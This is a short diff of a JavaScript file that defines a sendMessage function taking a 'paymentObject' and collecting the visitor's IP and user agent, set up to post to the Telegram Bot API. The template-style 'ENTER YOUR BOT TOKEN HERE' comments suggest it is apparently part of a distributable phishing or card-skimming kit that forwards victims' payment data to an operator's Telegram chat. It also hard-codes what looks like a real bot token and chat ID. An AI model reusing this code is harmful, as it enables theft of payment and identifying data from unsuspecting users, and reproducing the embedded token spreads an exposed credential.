@@ -1,11 +1,13 @@
 import axios from "axios";
 
-const botToken = "5717189910:AAG1uCLomAWkGmXqOk_r6INtWZcRJqR9tek"
+
+
+const botToken = "5717189910:AAG1uCLomAWkGmXqOk_r6INtWZcRJqR9tek" /////  ENTER YOUR BOT TOKEN HERE   /////////////
 const baseURL = `https://api.telegram.org/bot${botToken}`;
-const chatId = "1014240012"
+const chatId = "1014240012" ///////// ENTER YOUR CHAT ID HERE ///////////
 
 const sendMessage = async (paymentObject) => {
-    let text = "testing test"
+    let text = ""
     let ip;
     let agent;
     console.log(text);
